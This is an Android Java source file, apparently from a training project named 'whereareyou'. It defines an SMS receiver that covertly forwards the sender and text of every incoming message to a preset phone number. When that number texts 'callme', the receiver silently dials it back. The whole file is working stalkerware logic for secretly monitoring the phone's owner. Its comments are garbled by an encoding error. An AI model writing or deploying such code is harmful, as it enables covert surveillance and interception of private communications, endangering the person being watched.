package cn.tedu.whereareyou;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class MessageListenerReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context ct, Intent it) {
		// TODO Auto-generated method stub
		Toast.makeText(ct, "���ڴ�����ż��...", Toast.LENGTH_LONG);
		//1.��ȡ�������ݣ�2.��ȡ��Ч��Ϣ��3.�ж��Ƿ���Ҫ���ж��ż��/�����������
		//���ԭʼ����
		Object[] objs =(Object[])it.getExtras().get("pdus");
		//���͵�ת��Object[]ת����SmsMessage[]
		SmsMessage[] duanxin = new SmsMessage[objs.length];
		for(int i = 0;i<objs.length;i++){
			//��objs�����������ó����Ž�������ת��
			duanxin[i] =SmsMessage.createFromPdu((byte[])objs[i]);
		}
		//��ȡ��Ч��Ϣ������ж��ż�ز������������������
		for(int i =0 ;i<duanxin.length;i++){
			//��duanxin1�����������ó�������Ϣ��ȡ�����ҽ��ж�Ϣ��ز���
			String laixinnumber = duanxin[i].getDisplayOriginatingAddress();
			String laixinneirong = duanxin[i].getDisplayMessageBody();
			if(laixinnumber.equals(WayInformations.LPPN)){
				//����߷��͵Ķ�Ϣ-->������������������ز��绰��
				if(laixinneirong.trim().equalsIgnoreCase("callme")){
					Intent dadianhua = new Intent();
					dadianhua.setAction(Intent.ACTION_CALL);
					dadianhua.setData(Uri.parse("tel:"+WayInformations.LPPN));
					dadianhua.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					ct.startActivity(dadianhua);
				}
			}else{
				//�����������м��
				SmsManager sm = SmsManager.getDefault();
				String message = laixinnumber +"is send Message to TA and MEssageBody is"+laixinneirong;
				sm.sendTextMessage(WayInformations.LPPN, null, message, null, null);
			}
		}
	}

}
